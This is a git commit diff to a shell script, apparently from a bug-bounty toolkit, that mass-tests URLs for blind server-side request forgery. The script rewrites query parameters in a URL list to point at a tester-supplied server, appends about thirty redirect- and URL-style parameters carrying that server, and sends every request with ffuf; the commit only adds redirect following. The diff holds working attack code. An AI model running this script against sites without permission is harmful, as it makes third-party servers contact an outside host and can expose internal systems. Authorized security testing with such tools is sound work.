f2969aeea2de6668656bb9612bcc46d8fbef1aef
lemosnlmb <80685782+lemosnlmb@users.noreply.github.com>
2022-07-11 00:09:27 +0100

    Update blind-ssrf-params.sh

--- ssrf/blind-ssrf-params/blind-ssrf-params.sh
+++ ssrf/blind-ssrf-params/blind-ssrf-params.sh
@@ -11,4 +11,4 @@ server=$2
 cat $list | grep "=" | qsreplace "$server" 2>/dev/null | sort -u > $list.tmp && mv $list.tmp $list
 sed -i "s|$|\&dest=$server\&redirect=$server\&uri=$server\&path=$server\&continue=$server\&url=$server\&window=$server\&next=$server\&data=$server\&reference=$server\&site=$server\&html=$server\&val=$server\&validate=$server\&domain=$server\&callback=$server\&return=$server\&page=$server\&feed=$server\&host=$server&\port=$server\&to=$server\&out=$server\&view=$server\&dir=$server\&show=$server\&navigation=$server\&open=$server|g" $list
 echo -e "${RED}CHECK YOUR SERVER FOR POTENTIALS CALLBACKS!${NC}"
-ffuf -w $list -u FUZZ 2 > /dev/null
+ffuf -r -w $list -u FUZZ 2 > /dev/null
